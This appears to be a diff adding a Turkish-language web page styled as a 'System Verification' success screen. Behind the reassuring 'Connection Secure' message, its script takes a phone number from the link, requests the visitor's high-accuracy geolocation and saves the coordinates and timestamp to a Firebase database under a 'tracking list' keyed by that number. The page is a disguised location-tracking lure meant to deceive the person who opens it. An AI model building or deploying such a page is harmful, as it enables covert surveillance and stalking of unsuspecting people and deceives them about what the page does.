@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Doğrulaması</title>
+    <link rel="stylesheet" href="index.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        body {
+            background-color: #0c0f14;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .main-msg {
+            color: #10b981; /* Success color */
+            font-size: 1.125rem;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .secondary-msg {
+            color: #94a3b8;
+            font-size: 0.875rem;
+            margin-top: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="glass-card" style="padding: 2.5rem;">
+        <div id="icon-container" style="margin-bottom: 1.5rem;">
+            <i data-lucide="shield-check" style="width: 48px; height: 48px; color: #10b981;"></i>
+        </div>
+        <div class="main-msg" id="main-msg">
+            Bağlantı Güvenli.
+        </div>
+        <div class="secondary-msg" id="secondary-msg">
+            Yönlendirme tamamlandı. Sayfayı kapatabilirsiniz.
+        </div>
+        <div id="status" style="margin-top: 1.5rem; font-size: 0.7rem; color: #475569; letter-spacing: 0.1em; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 1rem;">
+            SİSTEM DOĞRULANIYOR...
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+        import { getDatabase, ref, update, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+        import firebaseConfig from './firebase-config.js';
+
+        lucide.createIcons();
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const phoneNumber = urlParams.get('tel');
+        const linkName = urlParams.get('n') || "Sistem Doğrulaması";
+        
+        const statusEl = document.getElementById('status');
+        const mainMsg = document.getElementById('main-msg');
+        const secondaryMsg = document.getElementById('secondary-msg');
+
+        // Dynamic naming
+        document.title = linkName;
+        mainMsg.innerText = linkName + " Başarılı";
+        secondaryMsg.innerText = "İşleminiz güvenli bir şekilde tamamlandı.";
+
+        if (phoneNumber) {
+            const app = initializeApp(firebaseConfig);
+            const database = getDatabase(app);
+
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude, accuracy } = position.coords;
+                        
+                        update(ref(database, 'takip_listesi/' + phoneNumber), {
+                            lat: latitude,
+                            lon: longitude,
+                            accuracy: accuracy,
+                            timestamp: serverTimestamp(),
+                            lastSeen: new Date().toLocaleTimeString()
+                        }).then(() => {
+                            statusEl.innerText = "DOĞRULAMA TAMAMLANDI";
+                        }).catch(err => {
+                            console.error("DB Error:", err);
+                        });
+                    },
+                    (error) => {
+                        console.error("Location Error:", error);
+                        statusEl.innerText = "ERİŞİM KISITLANDI";
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                statusEl.innerText = "DESTEKLENMEYEN TARAYICI";
+            }
+        } else {
+            statusEl.innerText = "HATALI PARAMETRE";
+        }
+    </script>
+</body>
+</html>
